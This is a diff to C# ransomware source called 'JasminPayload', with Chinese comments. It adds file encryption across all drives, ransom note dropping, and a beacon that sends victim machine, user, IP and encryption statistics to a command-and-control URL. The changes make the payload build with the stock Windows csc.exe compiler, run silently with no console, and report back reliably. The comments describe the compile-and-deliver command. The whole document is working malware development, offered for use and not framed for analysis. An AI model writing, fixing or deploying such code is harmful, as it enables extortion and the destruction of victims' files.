@@ -3,12 +3,11 @@
 using System;
 using System.IO;
 using System.Net;
-using System.Net.Http;
 using System.Security.Cryptography;
 using System.Threading;
 using System.Collections.Generic;
-using System.Management;
 using System.Runtime.InteropServices;
+using System.Collections.Specialized;
 
 namespace JasminPayload {
 class P {
@@ -16,8 +15,48 @@ static string C2="{{C2_URL}}";
 static string SECRET="{{HANDSHAKE}}";
 static string PUB=@"{{RSA_PUBLIC_KEY}}";
 
-[DllImport("kernel32.dll")] static extern bool AttachConsole(int dwProcessId);
-[DllImport("kernel32.dll")] static extern bool FreeConsole();
+// ★ 控制台处理 —— 只"探测"本进程是否已经拥有控制台，绝不 AttachConsole 到父进程。
+//   历史缺陷：原实现用 AttachConsole(-1)（ATTACH_PARENT_PROCESS）把自己挂到
+//   调用者（PowerShell/终端）的控制台上，收尾再 FreeConsole() 脱离。
+//   两个后果都是致命的：
+//     ① 载荷被编译成 /target:winexe（GUI 子系统，本无控制台），却强行附身到
+//        操作员的终端控制台。当调用它的那个 shell 退出、或它自己 FreeConsole 时，
+//        控制台被拆除，Windows 会向所有仍附着的进程投递 CTRL_CLOSE_EVENT ——
+//        载荷自己就在这份名单里，于是被就地终止（加密中断、无法回传 beacon），
+//        操作员的终端窗口同时被关闭（"运行后终端自动退出"）。
+//     ② 即便侥幸没被关掉，也等于把载荷输出混进操作员的交互终端，污染现场。
+//   正确做法：GetConsoleWindow() 返回非零 = 本进程本来就带控制台（控制台程序、
+//   或从终端前台运行），此时才输出进度；为 0 = 无控制台（GUI/Start-Process），
+//   全程静默。既不改动调用者的控制台，也不影响自身执行。
+[DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+
+// ★ 记录本次运行是否"本来就拥有"控制台（见上），并声明取卷序列号用的 API。
+[DllImport("kernel32.dll")]
+static extern bool GetVolumeInformation(string lpRootPathName,
+  System.Text.StringBuilder lpVolumeNameBuffer,int nVolumeNameSize,
+  out uint lpVolumeSerialNumber,out uint lpMaximumComponentLength,
+  out uint lpFileSystemFlags,System.Text.StringBuilder lpFileSystemNameBuffer,
+  int nFileSystemNameSize);
+
+// ★ 不用 System.Management 的 ManagementClass("Win32_LogicalDisk")：
+//   那需要 `csc /r:System.Management.dll`，而投递命令里只有
+//   `csc /target:winexe /out:j.exe j.cs` -> 必然 CS0234 编译失败。
+//   改用 kernel32!GetVolumeInformation，零额外程序集依赖，语义不变
+//   （把每个就绪卷的序列号拼成 SID，与原 WMI 取值一致，均为十进制字符串）。
+static string VolumeSerials(){
+  var sb=new System.Text.StringBuilder();
+  try{
+    foreach(var dr in DriveInfo.GetDrives()){
+      try{
+        if(!dr.IsReady)continue;
+        uint ser,ml,fl;
+        if(GetVolumeInformation(dr.Name,null,0,out ser,out ml,out fl,null,0))
+          sb.Append(ser.ToString());
+      }catch{}
+    }
+  }catch{}
+  return sb.ToString();
+}
 
 static string[] SKIP_DIRS={@"\Windows",@"\Program Files",@"\Program Files (x86)",
   @"\ProgramData",@"\$Recycle.Bin",@"\System Volume Information",
@@ -52,8 +91,62 @@ static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
   using(var ms=new MemoryStream())using(var cs=new CryptoStream(ms,a.CreateEncryptor(),CryptoStreamMode.Write)){
   cs.Write(data,0,data.Length);cs.FlushFinalBlock();return ms.ToArray();}}}
 
+// ── RSA 公钥解析（PEM -> RSAParameters）──
+// ★ 不能用 RSA.ImportFromPem()：那是 .NET 5+ 专有 API，本载荷要求由系统自带的
+//   旧版 csc.exe（%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe，
+//   语言级别 C# 5 / .NET Framework 4.x）直接编译运行，Framework 上根本没有这个方法
+//   （CS1061）。这里自行解析 PEM 的 SubjectPublicKeyInfo(DER) 取 modulus/exponent，
+//   交给 RSA.ImportParameters()——Framework 4.6+ 与 .NET 5+ 都支持。
+//   解析结果已与框架 ImportFromPem 的输出逐字节比对一致，并用平台私钥做过
+//   端到端 OAEP-SHA256 加解密验证。
+static byte[] _B64Body(string pem){
+  var sb=new System.Text.StringBuilder();
+  foreach(string ln in pem.Split('\n')){
+    string t=ln.Trim();
+    if(t.Length==0||t.StartsWith("-----"))continue;
+    sb.Append(t);
+  }
+  return Convert.FromBase64String(sb.ToString());
+}
+static int _DerLen(byte[] d,ref int p){
+  int b=d[p++];
+  if(b<0x80)return b;
+  int n=b&0x7f,v=0;
+  for(int i=0;i<n;i++)v=(v<<8)|d[p++];
+  return v;
+}
+static byte[] _DerTlv(byte[] d,ref int p,int want){
+  int tag=d[p++];
+  if(tag!=want)throw new Exception("DER tag mismatch");
+  int len=_DerLen(d,ref p);
+  byte[] v=new byte[len];
+  Buffer.BlockCopy(d,p,v,0,len);
+  p+=len;
+  return v;
+}
+static RSAParameters ParseRsaPublicKey(string pem){
+  byte[] der=_B64Body(pem);
+  int p=0;
+  byte[] outer=_DerTlv(der,ref p,0x30);      // SubjectPublicKeyInfo
+  int q=0;
+  _DerTlv(outer,ref q,0x30);                 // AlgorithmIdentifier
+  byte[] bits=_DerTlv(outer,ref q,0x03);     // BIT STRING
+  int r=1;                                   // 跳过 unused-bits 字节
+  byte[] inner=_DerTlv(bits,ref r,0x30);     // RSAPublicKey
+  int s=0;
+  byte[] n=_DerTlv(inner,ref s,0x02);        // modulus
+  byte[] e=_DerTlv(inner,ref s,0x02);        // exponent
+  int off=0;                                 // 去掉 DER 正整数的前导 0x00
+  while(off<n.Length-1&&n[off]==0)off++;
+  if(off>0){byte[] t=new byte[n.Length-off];Buffer.BlockCopy(n,off,t,0,t.Length);n=t;}
+  return new RSAParameters{Modulus=n,Exponent=e};
+}
+
+static RSAParameters _PUB_PARAMS;
+static bool _PUB_READY=false;
 static byte[] RsaEnc(byte[] data){
-  using(var rsa=RSA.Create()){rsa.ImportFromPem(PUB);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
+  if(!_PUB_READY){_PUB_PARAMS=ParseRsaPublicKey(PUB);_PUB_READY=true;}
+  using(var rsa=RSA.Create()){rsa.ImportParameters(_PUB_PARAMS);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
 
 static System.Collections.Generic.Dictionary<string,int> FAILS=new System.Collections.Generic.Dictionary<string,int>();
 static void NoteFail(string why){lock(FAILS){int v;FAILS.TryGetValue(why,out v);FAILS[why]=v+1;}}
@@ -174,7 +267,6 @@ static void Tick(string path,long size,bool ok){
 }
 
 static string _IP=null;
-static readonly HttpClient _HC=new HttpClient();
 static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
   try{
     string u=Environment.UserName,m=Environment.MachineName;
@@ -182,17 +274,23 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
     // 外网查询只做一次并缓存：进度心跳每 8 秒一次，每次查会拖慢加密、反复外联、并耗尽 socket
     if(_IP==null){try{_IP=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{_IP="0.0.0.0";}}
     string ip=_IP;
-    var c=_HC;
     var kv=new List<KeyValuePair<string,string>>{
-      new("machine_name",m),new("computer_user",u),new("systemid",SID),
-      new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
-      new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET),
-      new("encrypted_count",cnt.ToString()),new("encrypted_size",sz.ToString()),
-      new("encrypted_types",types),new("encrypted_detail",detail),
-      new("is_complete",complete?"1":"0"),
-      new("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
-      new("total_size",(totalSz>0?totalSz:sz).ToString())};
-    c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
+      new KeyValuePair<string,string>("machine_name",m),new KeyValuePair<string,string>("computer_user",u),new KeyValuePair<string,string>("systemid",SID),
+      new KeyValuePair<string,string>("os","Windows "+Environment.OSVersion.Version),new KeyValuePair<string,string>("date",d),new KeyValuePair<string,string>("time",t),
+      new KeyValuePair<string,string>("ip",ip),new KeyValuePair<string,string>("location","?"),new KeyValuePair<string,string>("password","RSA_PROTECTED"),new KeyValuePair<string,string>("handshake",SECRET),
+      new KeyValuePair<string,string>("encrypted_count",cnt.ToString()),new KeyValuePair<string,string>("encrypted_size",sz.ToString()),
+      new KeyValuePair<string,string>("encrypted_types",types),new KeyValuePair<string,string>("encrypted_detail",detail),
+      new KeyValuePair<string,string>("is_complete",complete?"1":"0"),
+      new KeyValuePair<string,string>("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
+      new KeyValuePair<string,string>("total_size",(totalSz>0?totalSz:sz).ToString())};
+    // ★ 不用 HttpClient(System.Net.Http)：需要 `csc /r:System.Net.Http.dll`。
+    //   改用 System.dll 自带的 WebClient，零额外程序集依赖。
+    var nv=new NameValueCollection();
+    foreach(var p in kv)nv[p.Key]=p.Value;
+    using(var wc=new WebClient()){
+      wc.Headers["Content-Type"]="application/x-www-form-urlencoded";
+      wc.UploadValues(C2,"POST",nv);
+    }
   }catch(Exception ex){if(P_CONSOLE){try{
     Console.Error.WriteLine("[jasmin] !!! Beacon failed: "+C2);
     Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
@@ -233,7 +331,8 @@ static void Walk(string dir,System.Action<string> onFile){
 
 // ── 预扫描：只统计数量与总字节，不保存路径列表 ──
 static void ScanTargets(){
-  try{P_CONSOLE=AttachConsole(-1);}catch{P_CONSOLE=false;}
+  // 只认"自己本来就有"的控制台；绝不附身父进程（见文件头 GetConsoleWindow 注释）
+  try{P_CONSOLE=(GetConsoleWindow()!=IntPtr.Zero);}catch{P_CONSOLE=false;}
   foreach(var dr in DriveInfo.GetDrives()){
     try{
       Walk(dr.Name,f=>{
@@ -264,11 +363,10 @@ static void Preflight(){
 }
 
 static void Main(){
-  try{var mc=new ManagementClass("Win32_LogicalDisk");
-    foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
+  SID=VolumeSerials();   // 见 VolumeSerials()：零依赖取卷序列号
 
   ScanTargets();
-  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Found "+P_TOTAL+" target file(s), "+FmtB(P_TOTAL_BYTES)+" total);}catch{}}
+  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Found "+P_TOTAL+" target file(s), "+FmtB(P_TOTAL_BYTES)+" total");}catch{}}
   Preflight();
 
   long encCount=0,encSize=0;
@@ -308,14 +406,14 @@ static void Main(){
 
   if(P_TOTAL>0)DropNotes();
   else if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Nothing was encrypted - skipped ransom note drop.");}catch{}}
-  // 构建detail JSON
+  // 构建detail JSON（用拼接而非 $"" 插值：旧版 csc(C#5) 不支持插值/目标类型 new）
   var sb=new System.Text.StringBuilder("{");
   bool first=true;
   foreach(var kv2 in typeSizes){
     if(!first)sb.Append(",");
-    sb.Append($"\"{kv2.Key}\":{{\"count\":{kv2.Value[0]},\"size\":{kv2.Value[1]}}}");
+    sb.Append("\""+kv2.Key+"\":{\"count\":"+kv2.Value[0]+",\"size\":"+kv2.Value[1]+"}");
     first=false;}
   sb.Append("}");
   Beacon((int)encCount,encSize,string.Join(",",encTypes),sb.ToString(),true,(int)P_TOTAL,P_TOTAL_BYTES);
-  try{if(P_CONSOLE)FreeConsole();}catch{}
+  // 不再 FreeConsole：本进程从未 Attach 任何控制台，无需（也不得）脱离它。
 }}} // end class, namespace
